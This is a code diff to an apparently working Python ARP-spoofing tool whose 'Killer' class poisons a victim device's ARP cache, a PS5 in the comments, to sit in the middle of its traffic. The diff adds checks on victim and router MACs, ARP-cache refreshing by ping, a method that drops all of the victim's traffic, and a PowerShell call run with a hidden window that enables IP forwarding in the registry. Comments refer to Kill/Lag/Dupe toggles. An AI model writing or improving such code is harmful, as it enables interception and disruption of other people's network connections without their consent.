@@ -1,7 +1,6 @@
 from scapy.all import ARP, Ether, conf
 from time import sleep
 import sys
-import subprocess
 import threading
 
 from networking.forwarder import MitmForwarder, _MAX_DELAY_MS, _MAX_SHAPING_KBPS
@@ -15,6 +14,9 @@ from tools.utils import (
     get_my_ip,
     good_mac,
     get_vendor,
+    run_command,
+    mac_address_is_usable,
+    lookup_mac_from_arp_table,
 )
 from constants import *
 
@@ -36,23 +38,23 @@ def enable_ip_forwarding():
             winreg.SetValueEx(key, 'IPEnableRouter', 0, winreg.REG_DWORD, 1)
             winreg.CloseKey(key)
         except Exception:
-            subprocess.run(
+            run_command(
                 [
                     'powershell',
                     '-NoProfile',
+                    '-WindowStyle',
+                    'Hidden',
                     '-Command',
                     "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters' "
                     "-Name 'IPEnableRouter' -Value 1 -Type DWord -Force",
                 ],
-                capture_output=True,
+                shell=False,
                 timeout=12,
-                check=False,
             )
-        subprocess.run(
+        run_command(
             ['netsh', 'interface', 'ipv4', 'set', 'global', 'forwarding=enabled'],
-            capture_output=True,
+            shell=False,
             timeout=12,
-            check=False,
         )
     except Exception:
         pass
@@ -151,6 +153,20 @@ class Killer:
             return
         router_ip = get_gateway_ip(guid)
         router_mac = get_gateway_mac(iface_ip, router_ip)
+        if (
+            sys.platform.startswith('win')
+            and router_ip
+            and not mac_address_is_usable(router_mac)
+        ):
+            try:
+                run_command(
+                    ['ping', '-n', '1', '-w', '500', str(router_ip)],
+                    shell=False,
+                    timeout=2,
+                )
+            except Exception:
+                pass
+            router_mac = get_gateway_mac(iface_ip, router_ip)
         self.router = {
             'ip': router_ip,
             'mac': router_mac,
@@ -160,6 +176,42 @@ class Killer:
             'admin': True,
         }
     
+    def mitm_prereqs_ok(self, victim) -> tuple[bool, str]:
+        """True when victim + router MACs are known enough to MITM on LAN."""
+        if not isinstance(victim, dict):
+            return False, 'no victim'
+        if self.iface.name == 'NULL':
+            return False, 'no network adapter'
+        if not mac_address_is_usable(victim.get('mac')):
+            return False, 'victim MAC unknown (ping PS5, rescan)'
+        if not mac_address_is_usable((self.router or {}).get('mac')):
+            return False, 'router MAC unknown (ping gateway, check Npcap)'
+        if not mac_address_is_usable(getattr(self.iface, 'mac', None)):
+            return False, 'PC adapter MAC unknown'
+        return True, ''
+
+    def _refresh_victim_mac_from_cache(self, victim) -> None:
+        """Best-effort ARP cache refresh for victim MAC before poison."""
+        if not isinstance(victim, dict):
+            return
+        ip = str(victim.get('ip') or '').strip()
+        if not ip:
+            return
+        iface_ip = str(getattr(self.iface, 'ip', None) or '').strip()
+        mac = lookup_mac_from_arp_table(ip, iface_ip)
+        if not mac_address_is_usable(mac) and sys.platform.startswith('win'):
+            try:
+                run_command(
+                    ['ping', '-n', '1', '-w', '500', ip],
+                    shell=False,
+                    timeout=2,
+                )
+            except Exception:
+                pass
+            mac = lookup_mac_from_arp_table(ip, iface_ip)
+        if mac_address_is_usable(mac):
+            victim['mac'] = mac
+
     def kill(self, victim, wait_after=2, *, ics_mode=False):
         """
         Spoofing victim.
@@ -170,6 +222,7 @@ class Killer:
         stays in sync; only the ARP loop runs in a background thread.
         """
         self._sync_iface_for_victim(victim, refresh_router=not ics_mode)
+        self._refresh_victim_mac_from_cache(victim)
         mac = victim['mac']
         # Reassert path: even if already marked killed, refresh victim record and restart
         # ARP worker generation so ON state recovers from stale/desynced workers.
@@ -184,6 +237,26 @@ class Killer:
         # unkill() mirrors this with _restore_arp_now(repeats=3) — keep them paired.
         self._poison_arp_now(victim, seq, repeats=3, delay_s=0)
         self._kill_arp_worker(victim, wait_after, seq)
+        if not ics_mode:
+            self.apply_traffic_cut(victim)
+
+    @threaded
+    def apply_traffic_cut(self, victim):
+        """
+        Drop all victim IP traffic that reaches us via ARP MITM.
+
+        ARP poison alone is not enough on Windows when IP forwarding is enabled —
+        the kernel may still relay frames unless user-space intercepts and drops them.
+        """
+        if not isinstance(victim, dict):
+            return
+        mac = victim.get('mac')
+        if not mac or mac not in self.killed:
+            return
+        ok, _reason = self.mitm_prereqs_ok(victim)
+        if not ok:
+            return
+        self.apply_percent_cut(victim, pass_percent=0)
 
     def reassert_poison(self, victim, repeats=3):
         """
@@ -443,6 +516,7 @@ class Killer:
         seq = self._next_op_seq(victim['mac'])
         if victim['mac'] in self.killed:
             self.killed.pop(victim['mac'])
+        self._stop_forwarder(victim['mac'])
         # Immediate ARP burst with no sleep — sleeps belong in @threaded _unkill_restore_worker
         # so the GUI thread returns instantly on Kill/Lag/Dupe OFF.
         self._restore_arp_now(victim, seq, repeats=3, delay_s=0)
